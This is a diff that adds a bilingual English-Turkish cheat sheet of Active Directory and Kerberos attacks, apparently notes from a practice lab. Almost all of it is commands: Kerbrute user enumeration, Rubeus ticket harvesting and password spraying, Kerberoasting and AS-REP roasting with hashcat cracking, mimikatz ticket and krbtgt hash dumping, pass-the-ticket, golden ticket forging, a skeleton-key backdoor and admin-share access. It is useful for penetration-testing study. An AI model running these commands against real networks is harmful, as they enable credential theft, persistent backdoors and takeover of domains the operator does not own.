@@ -1,0 +1,59 @@
+            Enumeration w/ Kerbrute 
+--Enumeration with Kerbrute-- (Kullanıcı adlarını numaralandırma)
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt => Enumeration usernames (Kullanıcı adlarını numaralandırır.)
+
+
+            Harvesting & Brute-Forcing Tickets w/ Rubeus 
+--Harvesting Tickets with Rubeus--
+Rubeus.exe harvest /interval:30 => get the TGT per 30 seconds (her 30 saniyede bir TGT toplar.)
+
+--Paasword spraying and  Brute Forcing with Rubeus.exe-- (Rubeus ile kaba kuvvet ve parola püskürtme saldırısı)
+Rubeus.exe brute /password:Password1 /noticket => Get the .kirbi tgt => (Parolayı tüm kullanıcılarda deneyerek kirbi TGT'yi verir.)
+
+
+            Kerberoasting w/ Rubeus & Impacket 
+1-)--Kerberoasting with Rubeus--
+Rubeus.exe kerberoast => Dump kerberos hashes (Kerberos karmasını boşaltır)
+hashcat -m 13100 -a 0 hash.txt Pass.txt => password cracking (şifreyi kır)
+
+2-)--Kerberoasting with impacket--
+sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request => Dump all kerberos hashes (Rubeus gibi dump eder)
+hashcat -m 13100 -a 0 hash.txt Pass.txt => crack the password (şifreyi kır)
+
+            AS-REP Roasting w/ Rubeus 
+--Dump the KRBASREP5 Hashes-- (Ön kimlik Doğrulama kapalı ise)
+Rubeus.exe asreproast =>Dump found vulnerable user hashes (savunmasız kullanıcı karmalarını boşaltacaktır.)
+hashcat -m 18200 hash.txt Pass.txt => crack the password (parolayı kır)
+
+            Pass the Ticket w/ mimikatz 
+--Dump Tickets with Mimikatz--
+1-) mimikatz.exe
+2-) privilege::debug
+3-) sekurlsa::tickets /export
+--Pass the Ticket w/ Mimikatz--
+1-) kerberos::ptt <ticket>
+2-) klist
+
+            Golden/Silver Ticket Attacks w/ mimikatz 
+--Dump the krbtgt hash-- (krbtgt hash'i gösterir)
+1-) mimikatz.exe
+2-) privilege::debug
+3-) lsadump::lsa /inject /name:krbtgt
+
+--Create a Golden/Silver Ticket--
+Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
+
+--Use the Golden/Silver Ticket to access other machines--
+1-) misc::cmd
+2-) dir \\DESKTOP\c$
+
+             Kerberos Backdoors w/ mimikatz 
+1-) mimikatz.exe
+2-) privilege::debug
+3-) misc::skeleton
+
+             Accessing The Forest
+1-) net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
+2-) dir \\Desktop-1\c$ /user:Machine1 mimikatz
+
+
